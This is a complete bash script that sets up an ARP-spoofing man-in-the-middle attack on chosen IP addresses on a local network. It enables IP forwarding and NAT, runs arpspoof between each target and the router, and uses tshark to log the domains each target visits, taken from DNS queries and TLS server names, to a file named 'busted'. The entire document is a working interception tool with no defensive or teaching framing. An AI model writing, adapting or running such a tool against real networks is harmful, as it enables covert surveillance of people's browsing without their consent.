#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

LOG_FILE="busted_multi_target_advanced.log"
SPOOF_PIDS=()

#-------------------------#
#  Dependency Checks      #
#-------------------------#
for cmd in ip tshark arpspoof awk sudo; do
    if ! command -v "$cmd" &>/dev/null; then
        echo "[!] Required command '$cmd' not found. Please install it before running the script."
        exit 1
    fi
done

# Ensure the script is run as root.
if [[ "$EUID" -ne 0 ]]; then
    echo "[!] This script must be run as root. Please run with sudo or as the root user."
    exit 1
fi

#-------------------------#
#  Utility Functions      #
#-------------------------#

# Detect the primary network interface
detect_interface() {
    local iface
    iface=$(ip route | awk '/default/ {print $5; exit}')
    if [ -z "$iface" ]; then
        read -rp "[*] Could not auto-detect interface. Enter interface (e.g., wlan1mon): " iface
        if [ -z "$iface" ]; then
            echo "[!] No interface provided. Exiting."
            exit 1
        fi
    fi
    echo "$iface"
}

# Detect the router (gateway) IP address
detect_router_ip() {
    local router_ip
    router_ip=$(ip route | awk '/default/ {print $3; exit}')
    if [ -z "$router_ip" ]; then
        echo "[!] Could not detect router IP. Exiting."
        exit 1
    fi
    echo "$router_ip"
}

# Cleanup function to stop ARP spoofing and restore iptables
cleanup() {
    echo -e "\n[*] Cleaning up ARP spoofing and iptables..."

    # Kill ARP spoofing processes if still running
    if [ "${#SPOOF_PIDS[@]}" -gt 0 ]; then
        for pid in "${SPOOF_PIDS[@]}"; do
            if kill -0 "$pid" 2>/dev/null; then
                kill "$pid" && wait "$pid" 2>/dev/null
            fi
        done
    fi

    # Flush iptables rules and chains
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain

    # Disable IP forwarding
    echo 0 > /proc/sys/net/ipv4/ip_forward

    echo "[*] Cleanup complete. Exiting."
}
# Trap SIGINT and EXIT to run cleanup
trap cleanup SIGINT EXIT

#-------------------------#
#  Main Script Logic      #
#-------------------------#

# Detect network interface and router IP
INTERFACE=$(detect_interface)
ROUTER_IP=$(detect_router_ip)
echo "[*] Using network interface: $INTERFACE"
echo "[*] Router IP detected: $ROUTER_IP"

# Get target IPs from user input
read -rp "[*] Enter target IPs separated by spaces (e.g., 192.168.0.6 192.168.0.10): " TARGET_IPS
TARGET_IP_ARRAY=($TARGET_IPS)
if [ "${#TARGET_IP_ARRAY[@]}" -eq 0 ]; then
    echo "[!] No target IPs provided. Exiting."
    exit 1
fi

# Enable IP forwarding
echo "[*] Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

# Configure iptables for NAT and forwarding
echo "[*] Setting up iptables rules..."
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -t nat -A POSTROUTING -o "$INTERFACE" -j MASQUERADE
iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i "$INTERFACE" -o "$INTERFACE" -j ACCEPT

# Start ARP spoofing for each target in the background
echo "[*] Launching ARP spoofing on target(s)..."
for TARGET_IP in "${TARGET_IP_ARRAY[@]}"; do
    arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$ROUTER_IP" > /dev/null 2>&1 &
    SPOOF_PIDS+=("$!")
done

# Allow ARP spoofing to take effect
sleep 3

# Begin capturing network traffic
echo "[*] Starting traffic capture. Press Ctrl+C to stop."
tshark -i "$INTERFACE" -Y "tls.handshake.extensions_server_name or dns.qry.name" \
    -T fields -e ip.src -e tls.handshake.extensions_server_name -e dns.qry.name |
awk -v targets="${TARGET_IP_ARRAY[*]}" '
BEGIN {
    split(targets, target_list, " ");
}
{
    # Check if the source IP is one of the targets and if either TLS or DNS field is present
    for (i in target_list) {
        if ($1 == target_list[i] && ($2 != "" || $3 != "")) {
            timestamp = strftime("[%Y-%m-%d %H:%M:%S]");
            server = ($2 != "") ? $2 : $3;
            print timestamp, $1, "→", server;
            fflush(stdout);
            break;
        }
    }
}' | tee -a "$LOG_FILE"
